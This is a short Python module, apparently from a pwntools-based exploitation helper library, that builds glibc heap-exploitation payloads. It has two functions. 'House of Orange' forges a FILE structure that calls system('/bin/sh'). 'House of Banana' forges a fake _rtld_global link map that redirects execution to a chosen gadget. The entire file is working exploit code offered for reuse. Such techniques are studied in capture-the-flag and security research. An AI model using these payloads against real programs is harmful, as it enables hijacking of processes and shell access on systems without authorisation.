#!/usr/bin/env python
# -*- coding: utf-8 -*-
from PwnT00ls.io_file.utils import get_io_str_jumps_offset, pack_file_flush_str_jumps
from PwnT00ls.lib.rtld import Rtld_Global
from pwn import p64, p32


def house_of_orange_payload(libc, libc_base):
    io_str_jump = libc_base + get_io_str_jumps_offset(libc)
    io_list_all = libc_base + libc.symbols["_IO_list_all"]
    system = libc_base + libc.symbols["system"]
    bin_sh = libc_base + next(libc.search(b"/bin/sh"))
    payload = pack_file_flush_str_jumps(io_str_jump, io_list_all, system, bin_sh)
    return payload


def house_of_banana_payload(heap_addr, gadget_addr):
    """hijack _rtld_global_ptr first"""
    # rtld_global_ptr_addr = libc.sym['_rtld_global']
    fake_rtld_global = Rtld_Global(heap_addr)
    fake_rtld_global.set(0, fake_rtld_global.offset(0x32 + 2))  # l_addr
    fake_rtld_global.set(1 + 2, fake_rtld_global.offset(2 + 2))  # l_next
    fake_rtld_global.set(3 + 2, fake_rtld_global.address)  # l_real
    fake_rtld_global.set(5 + 2, fake_rtld_global.offset(3 + 2))  # l_libname
    fake_rtld_global.set(6 + 2, fake_rtld_global.offset(8 + 2))  # l_info
    fake_rtld_global.set(7 + 2, fake_rtld_global.offset(2 + 2))
    fake_rtld_global.set(8 + 2, fake_rtld_global.offset(3 + 2))
    fake_rtld_global.set(13 + 2, fake_rtld_global.offset(8 + 2))
    fake_rtld_global.set(0x20 + 2, fake_rtld_global.offset(0x30 + 2))
    fake_rtld_global.set(0x22 + 2, fake_rtld_global.offset(0x23 + 2))
    fake_rtld_global.set(0x24 + 2, 0x8)  # func ptrs total len
    fake_rtld_global.set(0x32 + 2, gadget_addr)
    fake_rtld_global.set(0x60 + 2, 0x800000000)
    return fake_rtld_global.dump()
